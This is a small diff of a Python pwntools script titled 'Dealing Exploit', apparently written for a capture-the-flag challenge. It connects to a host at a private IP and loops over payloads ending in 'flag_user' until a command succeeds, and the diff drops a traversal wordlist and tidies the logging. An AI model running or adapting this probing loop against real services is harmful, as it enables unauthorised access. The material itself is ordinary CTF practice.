@@ -47,12 +47,7 @@ def dealing_cmd(r, cmd, note_name=b'test', content_len=b'5', content=b'test\n', 
 '''#########
 Dealing Exploit
 #########'''
-f = open('./Deep-Traversal.txt', 'r').read().split()
 init_port = sys.argv[1]
-try:
-    init_idx = sys.argv[2]
-except:
-    init_idx = 0
 r = remote('10.113.184.121', init_port)
 random = os.urandom(1).hex()
 dealing_cmd(r, 2, random=random)
@@ -64,7 +59,7 @@ while len(payload) < 128:
     # print(payload)
     res = dealing_cmd(r, 5, payload + b'flag_user')
     if res:
-        print(f'Successful payload = {payload + b"flag_user"}')
+        log.success(f'Successful payload = {payload + b"flag_user"}')
         break
 
 log.info("Done")
